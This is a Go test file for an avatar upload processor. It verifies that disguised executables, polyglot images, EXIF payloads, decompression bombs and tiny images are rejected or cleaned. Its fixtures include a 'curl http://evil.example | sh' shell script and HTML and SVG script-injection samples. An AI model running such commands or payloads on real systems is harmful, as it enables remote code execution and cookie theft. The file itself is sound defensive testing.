package media

import (
	"bytes"
	"errors"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"image/png"
	"os"
	"testing"
)

const payloadMarker = "PAYLOAD-MARKER-must-not-survive"

func solid(w, h int, c color.Color) *image.RGBA {
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.Set(x, y, c)
		}
	}
	return img
}

func encodeJPEG(t *testing.T, w, h int) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := jpeg.Encode(&b, solid(w, h, color.RGBA{217, 119, 87, 255}), nil); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func encodePNG(t *testing.T, img image.Image) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := png.Encode(&b, img); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func encodeGIF(t *testing.T, w, h int) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := gif.Encode(&b, solid(w, h, color.RGBA{0, 128, 255, 255}), nil); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// assertCleanJPEG - ровно один наш JPEG от SOI до EOI без чужих байтов; возвращает его стороны
func assertCleanJPEG(t *testing.T, out []byte) (int, int) {
	t.Helper()
	if !bytes.HasPrefix(out, []byte{0xFF, 0xD8}) || !bytes.HasSuffix(out, []byte{0xFF, 0xD9}) {
		t.Fatal("output must be a single JPEG from SOI to EOI")
	}
	if bytes.Contains(out, []byte(payloadMarker)) || bytes.Contains(out, []byte("\x7fELF")) ||
		bytes.Contains(out, []byte("PK\x03\x04")) || bytes.Contains(out, []byte("Exif")) {
		t.Fatal("foreign data survived re-encoding")
	}
	cfg, format, err := image.DecodeConfig(bytes.NewReader(out))
	if err != nil || format != "jpeg" || cfg.Width != cfg.Height {
		t.Fatalf("output: %v %s %dx%d", err, format, cfg.Width, cfg.Height)
	}
	return cfg.Width, cfg.Height
}

// assertCleanAvatar - обе версии чистые: маленькая 256×256, крупная - квадрат не больше LargeAvatarSize
func assertCleanAvatar(t *testing.T, a *Avatars) {
	t.Helper()
	if w, _ := assertCleanJPEG(t, a.Small); w != AvatarSize {
		t.Fatalf("small side = %d", w)
	}
	if w, _ := assertCleanJPEG(t, a.Large); w > LargeAvatarSize {
		t.Fatalf("large side = %d", w)
	}
}

func TestProcessAcceptsSupportedFormats(t *testing.T) {
	webp, err := os.ReadFile("testdata/sample.webp")
	if err != nil {
		t.Fatal(err)
	}
	cases := map[string][]byte{
		"jpeg": encodeJPEG(t, 600, 600),
		"png":  encodePNG(t, solid(640, 520, color.RGBA{10, 20, 30, 255})),
		"gif":  encodeGIF(t, 520, 520),
		"webp": webp,
	}
	for name, data := range cases {
		out, err := ProcessAvatar(data)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		assertCleanAvatar(t, out)
	}
}

func TestProcessRejectsNonImagesDisguisedAsPhotos(t *testing.T) {
	// всё это клиент мог прислать с именем photo.jpg и Content-Type image/jpeg - они не используются
	cases := map[string][]byte{
		"ELF executable":    append([]byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"), bytes.Repeat([]byte{0}, 64)...),
		"PE executable":     append([]byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"), bytes.Repeat([]byte{0}, 64)...),
		"Mach-O executable": append([]byte{0xcf, 0xfa, 0xed, 0xfe, 0x07, 0x00, 0x00, 0x01}, bytes.Repeat([]byte{0}, 64)...),
		"shell script":      []byte("#!/bin/sh\ncurl http://evil.example | sh\n"),
		"html with script":  []byte("<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html>"),
		"svg with script":   []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`),
		"pdf":               []byte("%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n"),
		"zip":               append([]byte("PK\x03\x04\x14\x00\x00\x00\x08\x00"), bytes.Repeat([]byte{1}, 64)...),
		// исполняемый файл, внутри которого дальше лежит настоящая картинка: тип решают первые байты
		"executable with image inside": append([]byte("\x7fELF\x02\x01\x01\x00"), encodeJPEG(t, 600, 600)...),
	}
	for name, data := range cases {
		if _, err := ProcessAvatar(data); !errors.Is(err, ErrUnsupportedType) {
			t.Errorf("%s: want ErrUnsupportedType, got %v", name, err)
		}
	}
}

func TestProcessStripsAppendedPayloadFromPolyglots(t *testing.T) {
	payload := append([]byte("\x7fELF\x02\x01\x01\x00"+payloadMarker), []byte("PK\x03\x04"+payloadMarker)...)
	for name, img := range map[string][]byte{
		"jpeg": encodeJPEG(t, 600, 600),
		"png":  encodePNG(t, solid(520, 520, color.Black)),
		"gif":  encodeGIF(t, 520, 520),
	} {
		polyglot := append(append([]byte(nil), img...), payload...)
		out, err := ProcessAvatar(polyglot)
		if err != nil {
			t.Fatalf("%s polyglot is still a valid image: %v", name, err)
		}
		assertCleanAvatar(t, out)
	}
}

func TestProcessDropsEXIF(t *testing.T) {
	src := encodeJPEG(t, 600, 600)
	// APP1 Exif сразу после SOI: внутри - данные, которые не должны попасть в хранилище
	body := []byte("Exif\x00\x00" + payloadMarker)
	app1 := append([]byte{0xFF, 0xE1, byte((len(body) + 2) >> 8), byte(len(body) + 2)}, body...)
	withExif := append(append([]byte{0xFF, 0xD8}, app1...), src[2:]...)
	if !bytes.Contains(withExif, []byte(payloadMarker)) {
		t.Fatal("fixture must carry the marker")
	}
	out, err := ProcessAvatar(withExif)
	if err != nil {
		t.Fatal(err)
	}
	assertCleanAvatar(t, out)
}

func TestProcessRejectsBrokenAndOversized(t *testing.T) {
	jpg := encodeJPEG(t, 600, 600)

	// «бомба»: в заголовке SOF0 стороны 40000×40000 - отсекается по DecodeConfig, до декодирования
	bomb := append([]byte(nil), jpg...)
	i := bytes.Index(bomb, []byte{0xFF, 0xC0})
	if i < 0 {
		t.Fatal("no SOF0 marker")
	}
	bomb[i+5], bomb[i+6] = 0x9C, 0x40 // высота 40000
	bomb[i+7], bomb[i+8] = 0x9C, 0x40 // ширина 40000

	cases := map[string][]byte{
		"empty":           nil,
		"truncated jpeg":  jpg[:len(jpg)/2],
		"decompress bomb": bomb,
		"too large file":  append(encodeJPEG(t, 600, 600), make([]byte, MaxUploadBytes)...),
		"magic only":      []byte{0xFF, 0xD8, 0xFF, 0xE0, 0, 0},
	}
	for name, data := range cases {
		if _, err := ProcessAvatar(data); !errors.Is(err, ErrInvalidImage) {
			t.Errorf("%s: want ErrInvalidImage, got %v", name, err)
		}
	}
}

func TestProcessCropsToSquareAndFlattensTransparency(t *testing.T) {
	// прозрачная картинка 400×200 - квадрат по центру, фон белый
	out, err := ProcessAvatar(encodePNG(t, solid(900, 600, color.RGBA{0, 0, 0, 0})))
	if err != nil {
		t.Fatal(err)
	}
	assertCleanAvatar(t, out)
	img, err := jpeg.Decode(bytes.NewReader(out.Small))
	if err != nil {
		t.Fatal(err)
	}
	r, g, b, _ := img.At(AvatarSize/2, AvatarSize/2).RGBA()
	if r>>8 < 240 || g>>8 < 240 || b>>8 < 240 {
		t.Fatalf("transparent must become white, got %d %d %d", r>>8, g>>8, b>>8)
	}
}

func FuzzProcessAvatar(f *testing.F) {
	var b bytes.Buffer
	_ = jpeg.Encode(&b, solid(520, 520, color.White), nil)
	f.Add(b.Bytes())
	b.Reset()
	_ = png.Encode(&b, solid(512, 512, color.Black))
	f.Add(b.Bytes())
	f.Add([]byte("GIF89a"))
	f.Add([]byte("\x7fELF"))
	f.Fuzz(func(t *testing.T, data []byte) {
		out, err := ProcessAvatar(data)
		if err == nil && (!bytes.HasPrefix(out.Small, []byte{0xFF, 0xD8}) || !bytes.HasPrefix(out.Large, []byte{0xFF, 0xD8})) {
			t.Fatal("accepted input must produce our JPEG")
		}
	})
}

func TestProcessLargeVersionIsNeverUpscaled(t *testing.T) {
	cases := map[string]struct{ w, h, wantLarge int }{
		"small photo keeps its size":    {700, 600, 600},
		"big photo is cut to the limit": {1600, 1300, LargeAvatarSize},
		"exactly the limit":             {LargeAvatarSize, LargeAvatarSize + 100, LargeAvatarSize},
	}
	for name, c := range cases {
		out, err := ProcessAvatar(encodePNG(t, solid(c.w, c.h, color.RGBA{200, 100, 50, 255})))
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		assertCleanAvatar(t, out)
		if w, _ := assertCleanJPEG(t, out.Large); w != c.wantLarge {
			t.Errorf("%s: large side = %d, want %d", name, w, c.wantLarge)
		}
	}
}

func TestProcessRejectsPhotosSmallerThanMinimum(t *testing.T) {
	// каждая сторона не меньше MinAvatarSide: и узкая, и низкая, и совсем маленькая картинка отклоняются
	for name, c := range map[string]struct{ w, h int }{
		"tiny":       {10, 10},
		"old limit":  {64, 64},
		"just under": {MinAvatarSide - 1, MinAvatarSide - 1},
		"narrow":     {MinAvatarSide - 1, 1000},
		"low":        {1000, MinAvatarSide - 1},
	} {
		if _, err := ProcessAvatar(encodePNG(t, solid(c.w, c.h, color.White))); !errors.Is(err, ErrImageTooSmall) {
			t.Errorf("%s (%dx%d): want ErrImageTooSmall, got %v", name, c.w, c.h, err)
		}
	}
	// ровно минимум проходит
	out, err := ProcessAvatar(encodePNG(t, solid(MinAvatarSide, MinAvatarSide, color.White)))
	if err != nil {
		t.Fatalf("exact minimum: %v", err)
	}
	assertCleanAvatar(t, out)
}
